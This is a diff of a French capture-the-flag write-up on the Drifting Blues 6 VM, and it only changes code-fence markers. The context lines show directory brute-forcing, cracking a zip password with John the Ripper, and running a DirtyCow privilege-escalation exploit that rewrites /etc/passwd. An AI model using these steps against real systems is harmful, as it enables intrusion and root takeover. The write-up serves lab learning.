@@ -10,7 +10,7 @@ Petite présentation tout de même avant d’enchaîner en vitesse grand V. [Ce 
 
 La VM fait tourner un site qui nous accueille avec le message suivant :  
 
-```plain
+```
 Drifting Blues Tech
 please don't hack
 enough is enough!!!
@@ -20,7 +20,7 @@ Amusant vu qu'on est sur le 6ème opus de cette saga de CTF. Oui quelque part on
 
 Je lance Wapiti dessus avec tous les modules dispos. Le buster intégré me remonte pas mal de choses intéressantes :  
 
-```plain
+```
 [*] Lancement du module buster 
 Found webpage http://192.168.56.11/index.html 
 Found webpage http://192.168.56.11/robots.txt 
@@ -45,7 +45,7 @@ TextPattern est un CMS et le README nous indique qu'il est ici en version 4.8.3.
 
 L'exploitation nécessite toutefois un compte que l'on a pas. Heureusement on trouve une piste dans le fichier *robots.txt* :  
 
-```plain
+```
 User-agent: *
 Disallow: /textpattern/textpattern
 
@@ -55,13 +55,13 @@ dont forget to add .zip extension to your dir-brute
 
 Je m'exécute :  
 
-```plain
+```
 feroxbuster -u http://192.168.56.11/ -w /fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -n -x php,txt,zip,html
 ```
 
 Il en ressort une archive spammer.zip protégée par mot de passe. Je génère le hash correspondant avec *zip2john* et *John the Ripper* casse ce dernier instantanément :  
 
-```plain
+```
 myspace4         (spammer.zip/creds.txt)
 ```
 
@@ -77,7 +77,7 @@ C'est de toute évidence le cheminement attendu car si un utilisateur avait ét�
 
 Plus qu'à prendre un des exploits pour [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) :  
 
-```plain
+```
 www-data@driftingblues:/tmp$ ./dirty g0tr00t 
 /etc/passwd successfully backed up to /tmp/passwd.bak 
 Please enter the new password: g0tr00t 
